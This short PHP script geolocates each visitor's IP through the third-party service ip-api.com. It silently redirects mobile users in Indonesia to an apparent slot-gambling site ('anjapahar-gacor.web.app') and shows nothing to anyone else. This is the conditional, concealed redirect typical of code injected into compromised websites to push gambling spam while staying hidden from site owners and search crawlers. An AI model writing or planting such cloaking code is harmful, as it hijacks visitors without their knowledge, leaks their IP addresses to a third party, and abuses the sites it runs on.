<?php
$apiUrl = "http://ip-api.com/json/";

$userIP = $_SERVER['REMOTE_ADDR'];

$geoData = file_get_contents($apiUrl . $userIP);
$geoData = json_decode($geoData, true);

function isMobileDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $mobileAgents = ['Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone', 'webOS'];

    foreach ($mobileAgents as $device) {
        if (stripos($userAgent, $device) !== false) {
            return true;
        }
    }
    return false;
}

if (in_array($geoData['countryCode'], ['ID']) && isMobileDevice()) {
    header("Location: https://anjapahar-gacor.web.app/");
    exit;
}

